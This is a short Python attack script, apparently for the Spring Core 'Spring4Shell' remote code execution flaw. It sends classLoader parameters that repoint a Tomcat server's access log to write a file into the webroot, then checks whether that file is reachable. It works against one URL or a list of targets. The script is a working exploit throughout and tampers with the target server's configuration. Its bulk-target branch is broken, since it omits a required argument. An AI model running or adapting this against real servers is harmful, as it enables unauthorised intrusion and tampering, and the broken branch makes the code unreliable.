#coding:utf-8

import requests
import argparse
import uuid
import base64
from urllib.parse import urljoin

def Exploit(url,webroot):
    headers = {
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    filename = str(uuid.uuid4().hex)

    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=vulnerable&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory={webroot}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        print(f"Attempting to drop file named {filename}.txt")
        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        txturl = urljoin(url, f"{filename}.txt")
        txtgo = requests.get(txturl,timeout=15,allow_redirects=False, verify=False)
        if txtgo.status_code == 200:
            print(f"File created at {txturl} - host is vulnerable")
    except Exception as e:
        print(e)
        pass




def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    parser.add_argument('--webroot',help='webroot for Tomcat (webapps/ROOT) by default',required=False)
    args = parser.parse_args()
    if not args.webroot:
        args.webroot = 'webapps/ROOT'
    if args.url:
        Exploit(args.url,args.webroot)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()